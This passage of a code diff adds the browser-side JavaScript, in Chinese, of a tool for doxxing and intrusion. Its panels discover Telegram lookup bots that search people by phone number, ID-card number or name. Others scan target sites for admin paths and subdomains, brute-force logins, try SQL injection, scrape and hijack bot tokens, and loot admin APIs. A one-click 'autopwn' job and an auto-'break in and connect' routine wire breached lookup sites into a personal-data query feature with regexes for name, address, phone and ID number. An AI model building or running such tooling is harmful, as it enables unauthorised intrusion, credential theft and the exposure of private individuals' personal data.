+        await tgApi('/api/config', { proxy: $('proxyCfg').value.trim() });
+        const r = await tgApi('/api/my/send-code', { phoneNumber: $('myPhone').value.trim() });
+        window.__myRandomHash = r.randomHash;
+        window.__myPhone = r.phone;
+        $('myMsg').innerHTML = '<span class="ok">登录码已发到 ' + escapeHtml(r.phone) + '，填到左边后点「自动申请并回填」</span>';
+      } catch (e) {
+        $('myMsg').innerHTML = '<span class="bad">' + escapeHtml(e.message) + '（国内直连不通，先填代理；频繁请求会被限流）</span>';
+      } finally { btn.disabled = false; btn.textContent = '发送登录码'; }
+    };
+
+    $('myVerify').onclick = async () => {
+      const btn = $('myVerify'); btn.disabled = true; btn.textContent = '申请中…';
+      try {
+        const r = await tgApi('/api/my/verify', {
+          phoneNumber: window.__myPhone || $('myPhone').value.trim(),
+          randomHash: window.__myRandomHash,
+          code: $('myCode').value.trim(),
+        });
+        if (r.apiId && r.apiHash) {
+          $('tgApiId').value = r.apiId;
+          $('tgApiHash').value = r.apiHash;
+          $('myMsg').innerHTML = '<span class="ok">已取得 apiId=' + escapeHtml(r.apiId) + ' / apiHash=' + escapeHtml(r.apiHash)
+            + '（来源：' + (r.source === 'existing' ? '已有应用' : '新建应用') + '），已自动保存并回填</span>';
+          loadTgStatus();
+        } else {
+          $('myMsg').innerHTML = '<span class="bad">未取到凭据，请重试</span>';
+        }
+      } catch (e) {
+        $('myMsg').innerHTML = '<span class="bad">' + escapeHtml(e.message) + '</span>';
+      } finally { btn.disabled = false; btn.textContent = '自动申请并回填'; }
+    };
+
+    $('tgSaveApi').onclick = async () => {
+      try {
+        await tgApi('/api/config', { telegram: { apiId: $('tgApiId').value.trim(), apiHash: $('tgApiHash').value.trim() } });
+        $('tgApiMsg').innerHTML = '<span class="ok">已保存到 ' + escapeHtml((await tgApi('/api/config')).userFile) + '</span>';
+        loadTgStatus();
+      } catch (e) { $('tgApiMsg').innerHTML = '<span class="bad">' + escapeHtml(e.message) + '</span>'; }
+    };
+
+    $('tgSendCode').onclick = async () => {
+      const btn = $('tgSendCode'); btn.disabled = true; btn.textContent = '发送中…';
+      try {
+        await tgApi('/api/config', { telegram: { apiId: $('tgApiId').value.trim(), apiHash: $('tgApiHash').value.trim() } });
+        const r = await tgApi('/api/tg/send-code', { phoneNumber: $('tgPhone').value.trim() });
+        $('tgLoginMsg').innerHTML = '<span class="ok">验证码已' + (r.isCodeViaApp ? '发到 Telegram 客户端' : '通过短信发送') + '，填入下方后点「完成登录」</span>';
+      } catch (e) {
+        $('tgLoginMsg').innerHTML = '<span class="bad">' + escapeHtml(e.message) + '</span>';
+      } finally { btn.disabled = false; btn.textContent = '发送验证码'; }
+    };
+
+    $('tgSignIn').onclick = async () => {
+      const btn = $('tgSignIn'); btn.disabled = true; btn.textContent = '登录中…';
+      try {
+        const r = await tgApi('/api/tg/sign-in', { code: $('tgCode').value.trim(), password: $('tgPwd').value });
+        $('tgLoginMsg').innerHTML = '<span class="ok">登录成功：' + escapeHtml((r.user && (r.user.username || r.user.firstName)) || '') + '，sessionString 已保存</span>';
+        loadTgStatus();
+      } catch (e) {
+        $('tgLoginMsg').innerHTML = '<span class="bad">' + escapeHtml(e.message) + '</span>';
+      } finally { btn.disabled = false; btn.textContent = '完成登录'; }
+    };
+
+    function renderFound(items, title) {
+      if (!items || !items.length) { $('tgFound').innerHTML = '<div class="hint">没有结果</div>'; return; }
+      let rows = '';
+      items.forEach((it, i) => {
+        if (!it.username) return;
+        rows += `<tr>
+          <td>${escapeHtml(it.title || '')}</td>
+          <td><code>${escapeHtml(it.username)}</code></td>
+          <td><span class="kind">${escapeHtml(it.kind)}</span></td>
+          <td>${it.participants !== undefined ? escapeHtml(it.participants) : ''}</td>
+          <td>
+            <select id="tgType${i}">
+              <option value="phone">手机号查询</option>
+              <option value="idcard">身份证号查询</option>
+              <option value="name">姓名反查</option>
+              <option value="any">任意输入</option>
+            </select>
+            <button class="ghost" data-add="${escapeHtml(it.username)}" data-idx="${i}" data-title="${escapeHtml(it.title || '')}">添加为数据源</button>
+          </td>
+        </tr>`;
+      });
+      $('tgFound').innerHTML = `<div class="card"><h3>${escapeHtml(title)}（${items.length}）</h3>
+        <table><tr><th>名称</th><th>用户名</th><th>类型</th><th>人数</th><th>操作</th></tr>${rows}</table></div>`;
+      $('tgFound').querySelectorAll('[data-add]').forEach((btn) => {
+        btn.onclick = async () => {
+          const idx = btn.getAttribute('data-idx');
+          const username = btn.getAttribute('data-add');
+          const title = btn.getAttribute('data-title');
+          const type = $('tgType' + idx).value;
+          btn.disabled = true;
+          try {
+            const j = await tgApi('/api/config');
+            const t = (j.config && j.config.telegram) || {};
+            const bots = (t.bots || []).slice();
+            const exist = bots.findIndex(b => b.target === username);
+            const bot = {
+              name: (title || username) + '(' + type + ')',
+              enabled: true,
+              type,
+              target: username,
+              queryTemplate: '{input}',
+              waitMs: t.waitMs || 10000,
+              parse: DEFAULT_PARSE,
+            };
+            if (exist >= 0) bots[exist] = bot; else bots.push(bot);
+            await tgApi('/api/config', { telegram: { enabled: true, bots } });
+            $('tgTarget').value = username;
+            $('tgLoginMsg').innerHTML = '<span class="ok">已添加数据源 ' + escapeHtml(username) + '（type=' + type + '），可在下方试查，或直接回到顶部查询</span>';
+            loadTgStatus();
+          } catch (e) {
+            $('tgLoginMsg').innerHTML = '<span class="bad">' + escapeHtml(e.message) + '</span>';
+          } finally { btn.disabled = false; }
+        };
+      });
+    }
+
+    $('tgSearch').onclick = async () => {
+      const btn = $('tgSearch'); btn.disabled = true; btn.textContent = '搜索中…';
+      $('tgFound').innerHTML = '<div class="hint">搜索中…</div>';
+      try {
+        const j = await tgApi('/api/tg/discover', { keyword: $('tgKeyword').value.trim(), limit: 40 });
+        renderFound(j.items, '搜索结果');
+      } catch (e) {
+        $('tgFound').innerHTML = '<div class="bad">' + escapeHtml(e.message) + '</div>';
+      } finally { btn.disabled = false; btn.textContent = '搜索'; }
+    };
+
+    $('tgDialogs').onclick = async () => {
+      const btn = $('tgDialogs'); btn.disabled = true;
+      $('tgFound').innerHTML = '<div class="hint">加载中…</div>';
+      try {
+        const j = await tgApi('/api/tg/dialogs?limit=80');
+        renderFound(j.items, '我已加入的会话');
+      } catch (e) {
+        $('tgFound').innerHTML = '<div class="bad">' + escapeHtml(e.message) + '</div>';
+      } finally { btn.disabled = false; }
+    };
+
+    $('tgProbe').onclick = async () => {
+      const btn = $('tgProbe'); btn.disabled = true; btn.textContent = '等待回复…';
+      $('tgProbeOut').innerHTML = '<div class="hint">已发送，等待机器人回复…</div>';
+      try {
+        const j = await tgApi('/api/tg/probe', { target: $('tgTarget').value.trim(), text: $('tgText').value.trim() });
+        const reply = j.reply || '(无回复)';
+        let rows = '';
+        ['name', 'address', 'phone', 'idcard'].forEach((k) => {
+          const v = extractBy(DEFAULT_PARSE[k].regex, reply);
+          rows += `<tr><td class="k">${k}</td><td>${v ? escapeHtml(v) : '<span class="empty">未匹配</span>'}</td></tr>`;
+        });
+        $('tgProbeOut').innerHTML = `<div class="card"><h3>机器人原始回复</h3><pre class="reply">${escapeHtml(reply)}</pre>
+          <table>${rows}</table>
+          <div class="hint">上面是用默认正则抠出的字段。若显示"未匹配"，按实际回复格式到 config 里改 bots[].parse.regex。</div></div>`;
+      } catch (e) {
+        $('tgProbeOut').innerHTML = '<div class="bad">' + escapeHtml(e.message) + '</div>';
+      } finally { btn.disabled = false; btn.textContent = '发送并取回回复'; }
+    };
+
+    // ---------- 后台突破面板 ----------
+    function parseHeaders(str) {
+      const h = {};
+      String(str || '').split(/[;\n]/).map((s) => s.trim()).filter(Boolean).forEach((s) => {
+        const i = s.indexOf(':');
+        if (i > 0) h[s.slice(0, i).trim()] = s.slice(i + 1).trim();
+      });
+      return h;
+    }
+
+    function parseBody(str) {
+      const o = {};
+      String(str || '').split('&').map((s) => s.trim()).filter(Boolean).forEach((s) => {
+        const i = s.indexOf('=');
+        if (i > 0) o[s.slice(0, i).trim()] = decodeURIComponent(s.slice(i + 1));
+      });
+      return o;
+    }
+
+    $('ofRecon').onclick = async () => {
+      const btn = $('ofRecon'); btn.disabled = true; btn.textContent = '侦察中…';
+      $('ofReconOut').innerHTML = '<div class="hint">正在探测后台入口、敏感文件、子域…</div>';
+      try {
+        const r = await tgApi('/api/offsec/recon', { url: $('ofUrl').value.trim() });
+        const fp = (r.fingerprints || []).length ? r.fingerprints.join(', ') : '未识别';
+        let rows = '';
+        (r.paths || []).forEach((p) => {
+          rows += `<tr><td><a href="${escapeHtml(p.url)}" target="_blank" rel="noopener">${escapeHtml(p.url.replace(r.target, ''))}</a></td>
+            <td>${p.status}</td><td>${p.size || ''}</td><td>${escapeHtml(p.title || '')}</td>
+            <td>${escapeHtml(p.note || '')}</td>
+            <td><button class="ghost" data-login="${escapeHtml(p.url)}">设为登录目标</button></td></tr>`;
+        });
+        let subRows = '';
+        (r.subdomains || []).forEach((s) => {
+          subRows += `<tr><td>${escapeHtml(s.host)}</td><td>${escapeHtml(s.ip)}</td>
+            <td><button class="ghost" data-login="http://${escapeHtml(s.host)}">侦察它</button></td></tr>`;
+        });
+        const tokens = (r.botTokens || []).map((t) => '<code>' + escapeHtml(t) + '</code>').join(' ');
+        $('ofReconOut').innerHTML =
+          `<div class="card"><h3>目标 ${escapeHtml(r.target)} · 指纹：${escapeHtml(fp)} · HTTP ${r.home.status} · ${r.home.ms}ms</h3>
+            <div class="hint">标题：${escapeHtml(r.home.title || '-')} ｜ Server：${escapeHtml(r.home.server || '-')} ｜ X-Powered-By：${escapeHtml(r.home.powered || '-')}</div>
+            ${tokens ? '<div class="kv"><span class="k">★ 页面里的 Bot Token</span><span>' + tokens + '</span></div>' : ''}
+            <table><tr><th>路径</th><th>状态</th><th>大小</th><th>标题</th><th>研判</th><th>操作</th></tr>${rows || '<tr><td colspan="6" class="empty">没探到有效路径</td></tr>'}</table></div>` +
+          ((r.subdomains || []).length
+            ? `<div class="card"><h3>存活子域（${r.subdomains.length}）</h3><table><tr><th>域名</th><th>IP</th><th>操作</th></tr>${subRows}</table></div>`
+            : '');
+        $('ofReconOut').querySelectorAll('[data-login]').forEach((b) => {
+          b.onclick = () => {
+            const u = b.getAttribute('data-login');
+            $('ofLoginUrl').value = u;
+            $('ofUrl').value = u.replace(/\/(admin|login|houtai|manage)[^/]*$/, '') || u;
+            $('ofBruteMsg').innerHTML = '<span class="ok">已设为登录目标：' + escapeHtml(u) + '</span>';
+          };
+        });
+      } catch (e) {
+        $('ofReconOut').innerHTML = '<div class="bad">' + escapeHtml(e.message) + '</div>';
+      } finally { btn.disabled = false; btn.textContent = '侦察'; }
+    };
+
+    async function doBrute(mode) {
+      const url = $('ofLoginUrl').value.trim();
+      if (!url) { $('ofBruteMsg').innerHTML = '<span class="bad">先填登录地址</span>'; return; }
+      const btn = mode === 'sqli' ? $('ofSqli') : $('ofBrute');
+      btn.disabled = true;
+      $('ofBruteOut').innerHTML = '<div class="hint">爆破中…（每组合一次请求，别对同一目标狂刷）</div>';
+      try {
+        const passwords = $('ofPasswords').value.split(/\r?\n/).map((s) => s.trim()).filter(Boolean);
+        const payload = {
+          url,
+          usernames: $('ofUsers').value.split(',').map((s) => s.trim()).filter(Boolean),
+          passwords,
+          cookie: $('ofCookie').value.trim(),
+        };
+        const r = mode === 'sqli'
+          ? await tgApi('/api/offsec/sqli', payload)
+          : await tgApi('/api/offsec/brute', payload);
+        if (r.error) { $('ofBruteOut').innerHTML = '<div class="bad">' + escapeHtml(r.error) + '</div>'; return; }
+        let rows = '';
+        (r.candidates || []).forEach((c) => {
+          rows += `<tr><td>${escapeHtml(c.username)}</td><td>${escapeHtml(c.password)}</td>
+            <td>${escapeHtml(c.evidence || '')}</td><td>${c.status}</td>
+            <td><button class="ghost" data-cookie="${escapeHtml(c.cookie || '')}" data-url="${escapeHtml(url)}">带入下一步</button></td></tr>`;
+        });
+        $('ofBruteOut').innerHTML = `<div class="card"><h3>命中候选（${(r.candidates || []).length}）· 已试 ${r.triedCount || 0} 组合</h3>
+          <div class="hint">登录页标题：${escapeHtml((r.loginPage && r.loginPage.title) || '-')} ｜ 表单字段：${escapeHtml(((r.loginPage && r.loginPage.fields) || []).join(','))}${r.loginPage && r.loginPage.hasCaptcha ? ' ｜ <span class="bad">有验证码</span>' : ''}</div>
+          <table><tr><th>用户名</th><th>口令/载荷</th><th>判定依据</th><th>状态</th><th>操作</th></tr>
+          ${rows || '<tr><td colspan="5" class="empty">没撞出来，换字典或试试注入</td></tr>'}</table></div>`;
+        $('ofBruteOut').querySelectorAll('[data-cookie]').forEach((b) => {
+          b.onclick = () => {
+            $('ofCookie').value = b.getAttribute('data-cookie');
+            $('ofHeaders').value = 'Cookie: ' + b.getAttribute('data-cookie');
+            $('ofBruteMsg').innerHTML = '<span class="ok">Cookie 已带入「④ 直调接口」</span>';
+          };
+        });
+      } catch (e) {
+        $('ofBruteOut').innerHTML = '<div class="bad">' + escapeHtml(e.message) + '</div>';
+      } finally { btn.disabled = false; }
+    }
+    $('ofBrute').onclick = () => doBrute('brute');
+    $('ofSqli').onclick = () => doBrute('sqli');
+
+    $('ofTokenFrom').onclick = async () => {
+      try {
+        const r = await tgApi('/api/offsec/tokens', { url: $('ofLoginUrl').value.trim() || $('ofUrl').value.trim() });
+        if (r.tokens && r.tokens.length) {
+          $('ofToken').value = r.tokens[0];
+          $('ofBotOut').innerHTML = '<span class="ok">抠到 ' + r.tokens.length + ' 个 token，已填入</span>';
+        } else {
+          $('ofBotOut').innerHTML = '<span class="bad">页面里没找到 token（试试 .env / 后台配置页 / 源码压缩包）</span>';
+        }
+      } catch (e) { $('ofBotOut').innerHTML = '<span class="bad">' + escapeHtml(e.message) + '</span>'; }
+    };
+
+    async function botCall(method, params) {
+      const token = $('ofToken').value.trim();
+      if (!token) { $('ofBotOut').innerHTML = '<span class="bad">先填 Bot Token</span>'; return; }
+      try {
+        const r = await tgApi('/api/offsec/bot', { token, method, params });
+        $('ofBotOut').innerHTML = `<div class="card"><h3>${escapeHtml(method)} → ${r.ok ? '<span class="ok">ok</span>' : '<span class="bad">失败</span>'}</h3>
+          <pre class="reply">${escapeHtml(JSON.stringify(r.result || r.description || r.raw, null, 2))}</pre></div>`;
+        if (r.ok && method === 'getMe' && r.result) {
+          $('ofBruteMsg').innerHTML = '<span class="ok">接管成功：@' + escapeHtml(r.result.username || '') + '（' + escapeHtml(r.result.first_name || '') + '）</span>';
+        }
+      } catch (e) { $('ofBotOut').innerHTML = '<span class="bad">' + escapeHtml(e.message) + '</span>'; }
+    }
+    $('ofGetMe').onclick = () => botCall('getMe');
+    $('ofUpdates').onclick = () => botCall('getUpdates', { limit: 50 });
+
+    $('ofCall').onclick = async () => {
+      const url = $('ofApi').value.trim();
+      if (!url) { $('ofCallOut').innerHTML = '<span class="bad">先填接口地址</span>'; return; }
+      try {
+        const r = await tgApi('/api/offsec/call', {
+          url,
+          method: $('ofMethod').value,
+          headers: parseHeaders($('ofHeaders').value),
+          body: $('ofBody').value.trim() ? parseBody($('ofBody').value) : null,
+        });
+        $('ofCallOut').innerHTML = `<div class="card"><h3>HTTP ${r.status} · ${r.length} 字节 · ${r.ms}ms</h3>
+          <pre class="reply">${escapeHtml(r.body)}</pre>
+          <button class="ghost" id="ofImport">导入为数据源（targets）</button></div>`;
+        $('ofImport').onclick = async () => {
+          try {
+            const j = await tgApi('/api/config');
+            const targets = ((j.config && j.config.targets) || []).slice();
+            targets.push({
+              name: '后台接口-' + (new URL(url).hostname),
+              enabled: true,
+              type: 'any',
+              method: $('ofMethod').value,
+              url,
+              headers: parseHeaders($('ofHeaders').value),
+              body: $('ofBody').value.trim() ? parseBody($('ofBody').value) : null,
+              extract: {
+                '姓名': 'regex:姓名[:：]\\s*([^\\s\\n<]+)',
+                '住址': 'regex:(?:住址|地址|户籍)[:：]\\s*([^\\n<]+)',
+                '电话': 'regex:(?:手机|电话)[:：]\\s*([0-9]{7,15})',
+                '身份证': 'regex:(?:身份证号?|证件号)[:：]\\s*([0-9Xx]{15,18})',
+              },
+              timeout: 20000,
+            });
+            await tgApi('/api/config', { targets });
+            $('ofCallOut').innerHTML += '<div class="hint"><span class="ok">已导入 targets，回顶部输入手机号/身份证即可走这个接口</span></div>';
+          } catch (e) {
+            $('ofCallOut').innerHTML += '<div class="bad">' + escapeHtml(e.message) + '</div>';
+          }
+        };
+      } catch (e) { $('ofCallOut').innerHTML = '<div class="bad">' + escapeHtml(e.message) + '</div>'; }
+    };
+
+    $('ofLoot').onclick = async () => {
+      const base = $('ofUrl').value.trim();
+      if (!base) { $('ofCallOut').innerHTML = '<span class="bad">先在①填目标根地址</span>'; return; }
+      $('ofCallOut').innerHTML = '<div class="hint">带着 Cookie 扫后台页面与常见查询接口…</div>';
+      try {
+        const r = await tgApi('/api/offsec/loot', {
+          baseUrl: base,
+          cookie: $('ofCookie').value.trim(),
+          sampleParams: $('ofBody').value.trim() ? parseBody($('ofBody').value) : { keyword: '13800138000' },
+        });
+        let apiRows = '';
+        (r.queryApis || []).forEach((a) => {
+          apiRows += `<tr><td>${escapeHtml(a.path)}</td><td>${a.status}</td><td>${a.size}</td>
+            <td><button class="ghost" data-api="${escapeHtml(base + a.path)}">填入④</button></td></tr>`;
+        });
+        $('ofCallOut').innerHTML = `<div class="card"><h3>扫荡结果</h3>
+          <div class="kv"><span class="k">Bot Token</span><span>${(r.botTokens || []).map((t) => '<code>' + escapeHtml(t) + '</code>').join(' ') || '<span class="empty">无</span>'}</span></div>
+          <div class="kv"><span class="k">可访问的后台页</span><span>${escapeHtml((r.adminPages || []).map((p) => p.path).join(' ') || '无')}</span></div>
+          <div class="kv"><span class="k">有价值的链接</span><span>${escapeHtml((r.interestingLinks || []).slice(0, 20).join(' '))}</span></div>
+          <table><tr><th>查询接口</th><th>状态</th><th>大小</th><th>操作</th></tr>${apiRows || '<tr><td colspan="4" class="empty">没盲到接口</td></tr>'}</table></div>`;
+        $('ofCallOut').querySelectorAll('[data-api]').forEach((b) => {
+          b.onclick = () => { $('ofApi').value = b.getAttribute('data-api'); };
+        });
+      } catch (e) { $('ofCallOut').innerHTML = '<div class="bad">' + escapeHtml(e.message) + '</div>'; }
+    };
+
+    // ---------- 一键接管面板 ----------
+    let apJob = null, apTimer = null;
+
+    function apSplit(v) {
+      return String(v || '').split(/[,，\n]/).map((s) => s.trim()).filter(Boolean);
+    }
+
+    function renderAp(st) {
+      const rows = (st.steps || []).map((s) => {
+        const cls = s.level === 'hit' ? 'ok' : (s.level === 'warn' ? 'warn' : '');
+        return `<tr><td>${escapeHtml(s.stage)}</td><td class="${cls}">${escapeHtml(s.msg)}</td></tr>`;
+      }).join('');
+
+      let sum = '';
+      const R = st.result || {};
+      if (R.bots) {
+        sum += `<div class="kv"><span class="k">① 找到机器人</span><span>${R.bots.length} 个${
+          R.bots.filter((b) => (b.urls || []).length).length ? '，其中 ' + R.bots.filter((b) => (b.urls || []).length).length + ' 个简介带网址' : ''
+        }</span></div>`;
+      }
+      if (R.sites && R.sites.length) {
+        const srows = R.sites.map((s) => `<tr>
+          <td>${escapeHtml(s.host)}</td>
+          <td>${escapeHtml((s.fingerprints || []).join(',') || '—')}</td>
+          <td class="${(s.leaks || []).length ? 'ok' : ''}">${(s.leaks || []).length ? escapeHtml((s.leaks || []).map((l) => l.note).join('; ')) : '—'}</td>
+          <td>${(s.loginUrls || []).length ? '<span class="ok">' + (s.loginUrls || []).length + ' 个</span>' : '—'}</td>
+          <td><button class="ghost" data-site="${escapeHtml(s.url)}">填进下方①</button></td></tr>`).join('');
+        sum += `<div class="card"><h3>④ 侦察结果</h3>
+          <table><tr><th>站点</th><th>指纹</th><th>泄露面</th><th>登录页</th><th>操作</th></tr>${srows}</table></div>`;
+      }
+      if ((R.logins || []).length) {
+        const lrows = R.logins.slice(0, 20).map((l) => `<tr>
+          <td>${escapeHtml(l.site)}</td><td>${escapeHtml(l.via)}</td>
+          <td class="ok">${escapeHtml(l.username || '')} / ${escapeHtml(l.password || '')}</td>
+          <td><button class="ghost" data-ck="${escapeHtml(l.cookie || '')}" data-lu="${escapeHtml(l.url)}">带去②</button></td></tr>`).join('');
+        sum += `<div class="card"><h3>⑤ 破登录命中</h3>
+          <table><tr><th>站点</th><th>方式</th><th>账号/口令</th><th>操作</th></tr>${lrows}</table></div>`;
+      }
+      if ((R.tokens || []).length) {
+        const trows = R.tokens.map((t) => `<tr>
+          <td>${escapeHtml(String(t.token).slice(0, 14))}…</td><td>${escapeHtml(t.from || '')}</td>
+          <td class="${t.ok ? 'ok' : 'warn'}">${t.ok ? ('已接管 ' + escapeHtml(t.username || t.firstName || '')) : escapeHtml(t.error || '无效')}</td>
+          <td><button class="ghost" data-tk="${escapeHtml(t.token)}">填进③</button></td></tr>`).join('');
+        sum += `<div class="card"><h3>⑦ 接管机器人</h3>
+          <table><tr><th>Token</th><th>来源</th><th>getMe</th><th>操作</th></tr>${trows}</table></div>`;
+      }
+      if ((R.apis || []).length) {
+        const arows = R.apis.map((a, i) => `<tr>
+          <td>${escapeHtml(a.path)}</td><td>${a.status}</td><td>${a.size}</td>
+          <td><code>${escapeHtml(String(a.preview || '').slice(0, 90))}</code></td>
+          <td><button class="ghost" data-ap="${escapeHtml(a.url)}" data-ack="${escapeHtml(a.cookie || '')}">填进④</button></td></tr>`).join('');
+        sum += `<div class="card"><h3>⑥ 盲到的查询接口</h3>
+          <table><tr><th>路径</th><th>状态</th><th>大小</th><th>预览</th><th>操作</th></tr>${arows}</table></div>`;
+      }
+      if (R.imported) sum += `<div class="hint"><span class="ok">已自动导入 ${R.imported} 个数据源到 targets，回顶部输入手机号/身份证即可查询</span></div>`;
+
+      $('apOut').innerHTML = `
+        <div class="card"><h3>进度 ${st.done ? '<span class="ok">已完成</span>' : '运行中…'} · ${Math.round(st.ms / 1000)}s${st.error ? ' · <span class="bad">' + escapeHtml(st.error) + '</span>' : ''}</h3></div>
+        ${sum}
+        <div class="card"><h3>任务日志</h3>
+          <table><tr><th style="width:120px">阶段</th><th>内容</th></tr>${rows || '<tr><td colspan="2" class="empty">暂无</td></tr>'}</table></div>`;
+
+      $('apOut').querySelectorAll('[data-site]').forEach((b) => { b.onclick = () => { $('ofUrl').value = b.getAttribute('data-site'); }; });
+      $('apOut').querySelectorAll('[data-ck]').forEach((b) => { b.onclick = () => { $('ofLoginUrl').value = b.getAttribute('data-lu'); $('ofCookie').value = b.getAttribute('data-ck'); }; });
+      $('apOut').querySelectorAll('[data-tk]').forEach((b) => { b.onclick = () => { $('ofToken').value = b.getAttribute('data-tk'); }; });
+      $('apOut').querySelectorAll('[data-ap]').forEach((b) => { b.onclick = () => { $('ofApi').value = b.getAttribute('data-ap'); $('ofHeaders').value = 'Cookie: ' + b.getAttribute('data-ack'); $('ofMethod').value = 'POST'; }; });
+    }
+
+    $('apStart').onclick = async () => {
+      const btn = $('apStart');
+      btn.disabled = true;
+      $('apMsg').innerHTML = '<span class="hint">启动中…</span>';
+      try {
+        const r = await tgApi('/api/offsec/autopwn', {
+          keywords: apSplit($('apKw').value),
+          limit: parseInt($('apLimit').value || '20', 10),
+          maxProbe: parseInt($('apMaxProbe').value || '0', 10),
+          probeText: $('apProbeText').value.trim(),
+          sites: apSplit($('apSites').value),
+          usernames: apSplit($('apUsers').value),
+          passwords: apSplit($('apPasswords').value),
+          maxSites: parseInt($('apMaxSites').value || '6', 10),
+          maxBreach: parseInt($('apMaxBreach').value || '3', 10),
+          subdomains: $('apSubs').value === '1',
+          importTargets: $('apImport').value === '1',
+        });
+        apJob = r.jobId;
+        $('apMsg').innerHTML = '<span class="hint">任务 ' + escapeHtml(apJob) + ' 运行中…</span>';
+        if (apTimer) clearInterval(apTimer);
+        apTimer = setInterval(async () => {
+          try {
+            const st = await tgApi('/api/offsec/autopwn/status?id=' + encodeURIComponent(apJob));
+            renderAp(st);
+            if (st.done) {
+              clearInterval(apTimer); apTimer = null;
+              $('apMsg').innerHTML = st.error ? '<span class="bad">' + escapeHtml(st.error) + '</span>' : '<span class="ok">完成</span>';
+              btn.disabled = false;
+            }
+          } catch (e) { /* 轮询失败忽略，下轮再试 */ }
+        }, 1500);
+      } catch (e) {
+        $('apMsg').innerHTML = '<span class="bad">' + escapeHtml(e.message) + '</span>';
+        btn.disabled = false;
+      }
+    };
+
+    $('apStop').onclick = async () => {
+      if (!apJob) return;
+      await tgApi('/api/offsec/autopwn/stop', { id: apJob });
+      $('apMsg').innerHTML = '<span class="warn">已请求停止（等当前步骤结束）</span>';
+    };
+
+    // ---------- 极简主区：接入查档站 / 数据源管理 / 网络自检 ----------
+    async function api(path, body) {
+      const opt = { method: body ? 'POST' : 'GET', headers: { 'Content-Type': 'application/json' } };
+      if (body) opt.body = JSON.stringify(body);
+      const r = await fetch(path, opt);
+      const j = await r.json();
+      if (!r.ok) throw new Error(j.error || ('HTTP ' + r.status));
+      return j;
+    }
+
+    // ---------- ① 自动找源（用户不用提供任何网址） ----------
+    let dsJob = null, dsTimer = null;
+
+    function pushLog(box, lines) {
+      (lines || []).forEach((l) => {
+        const d = document.createElement('div');
+        if (l.level === 'hit') d.className = 'ok';
+        if (l.level === 'warn') d.className = 'warn';
+        d.textContent = '[' + l.stage + '] ' + l.msg;
+        box.appendChild(d);
+      });
+      box.scrollTop = box.scrollHeight;
+    }
+
+    function renderDs(st) {
+      const box = $('dsLog');
+      const known = (window.__dsSeen || (window.__dsSeen = new Set()));
+      pushLog(box, (st.steps || []).filter((s) => {
+        const k = s.t + '|' + s.stage + '|' + s.msg;
+        if (known.has(k)) return false;
+        known.add(k);
+        return true;
+      }));
+
+      if (st.done) {
+        const R = st.result || {};
+        const rows = (R.connected || []).map((c) =>
+          `<tr><td class="ok">${escapeHtml(c.host)}</td><td>${escapeHtml(c.name || '')}</td><td>${escapeHtml(c.body || '')}</td></tr>`).join('');
+        $('dsOut').innerHTML = `<div class="card"><h3>自动找源结果</h3>
+          <div class="kv"><span class="k">搜到候选</span><span>${R.candidates || 0} 个</span></div>
+          <div class="kv"><span class="k">首页像查档站</span><span>${R.good || 0} 个</span></div>
+          <div class="kv"><span class="k">成功接入</span><span class="ok">${(R.connected || []).length} 个</span></div>
+          <table><tr><th>站点</th><th>数据源名</th><th>参数</th></tr>${rows || '<tr><td colspan="3" class="empty">这次没接到</td></tr>'}</table>
+          ${(R.connected || []).length
+            ? '<div class="hint"><span class="ok">现在在上面输手机号或身份证号就能查了。</span></div>'
+            : '<div class="hint"><span class="warn">没接到源。可再点一次换一批搜索结果；如果搜索引擎打不开，先点「自动检测系统代理」。</span></div>'}
+        </div>`;
+      }
+    }
+
+    $('dsStart').onclick = async () => {
+      const btn = $('dsStart');
+      btn.disabled = true;
+      window.__dsSeen = new Set();
+      $('dsLog').innerHTML = '';
+      $('dsOut').innerHTML = '';
+      $('dsMsg').innerHTML = '<span class="hint">正在自动找源…（搜索 → 快筛 → 逐个攻破，可能几分钟）</span>';
+      try {
+        const r = await api('/api/discover/start', {
+          maxProbe: parseInt($('dsMax').value || '8', 10),
+          maxOk: 3,
+        });
+        dsJob = r.jobId;
+        if (dsTimer) clearInterval(dsTimer);
+        dsTimer = setInterval(async () => {
+          try {
+            const st = await api('/api/discover/status?id=' + encodeURIComponent(dsJob));
+            renderDs(st);
+            if (st.done) {
+              clearInterval(dsTimer); dsTimer = null;
+              $('dsMsg').innerHTML = st.error
+                ? '<span class="bad">' + escapeHtml(st.error) + '</span>'
+                : ('<span class="ok">完成，接入 ' + (((st.result || {}).connected) || []).length + ' 个</span>');
+              btn.disabled = false;
+              await loadTargets();
+            }
+          } catch (e) { /* 轮询失败忽略 */ }
+        }, 1500);
+      } catch (e) {
+        $('dsMsg').innerHTML = '<span class="bad">' + escapeHtml(e.message) + '</span>';
+        btn.disabled = false;
+      }
+    };
+
+    $('dsStop').onclick = async () => {
+      if (!dsJob) return;
+      await api('/api/discover/stop', { id: dsJob });
+      $('dsMsg').innerHTML = '<span class="warn">已请求停止（等当前站点跑完）</span>';
+    };
+
+    // ---------- ② 接入一个查档站 ----------
+    $('qcGo').onclick = async () => {
+      const url = $('qcUrl').value.trim();
+      if (!url) { $('qcMsg').innerHTML = '<span class="bad">先填查档站网址</span>'; return; }
+      const btn = $('qcGo');
+      btn.disabled = true;
+      $('qcLog').innerHTML = '';
+      $('qcMsg').innerHTML = '<span class="hint">正在自动攻破…（侦察 → 破登录 → 找接口 → 试参数，可能要一两分钟）</span>';
+      try {
+        const r = await api('/api/quick/connect', {
+          url: url.startsWith('http') ? url : ('http://' + url),
+          cookie: $('qcCookie').value.trim(),
+          subdomains: $('qcSubs').value === '1',
+        });
+        (r.log || []).forEach((l) => {
+          const d = document.createElement('div');
+          if (l.level === 'hit') d.className = 'ok';
+          if (l.level === 'warn') d.className = 'warn';
+          d.textContent = '[' + l.stage + '] ' + l.msg;
+          $('qcLog').appendChild(d);
+        });
+        if (r.target) {
+          $('qcMsg').innerHTML = '<span class="ok">已接入：' + escapeHtml(r.target.name) +
+            '（参数 ' + escapeHtml(r.target.body) + '）。现在在上面输手机号或身份证号即可查询。</span>';
+        } else {
+          $('qcMsg').innerHTML = '<span class="bad">' + escapeHtml(r.warning || '没找到可用的查询接口') + '</span>';
+        }
+        await loadTargets();
+      } catch (e) {
+        $('qcMsg').innerHTML = '<span class="bad">' + escapeHtml(e.message) + '</span>';
+      } finally { btn.disabled = false; }
+    };
+
+    async function loadTargets() {
+      try {
+        const j = await api('/api/quick/targets');
+        const list = j.targets || [];
+        if (!list.length) {
+          $('qcTargets').innerHTML = '<div class="hint">还没有接入任何查档站。在上面填网址点「自动攻破并接入」。</div>';
+          return;
+        }
+        $('qcTargets').innerHTML = list.map((t) => `<div class="srcline">
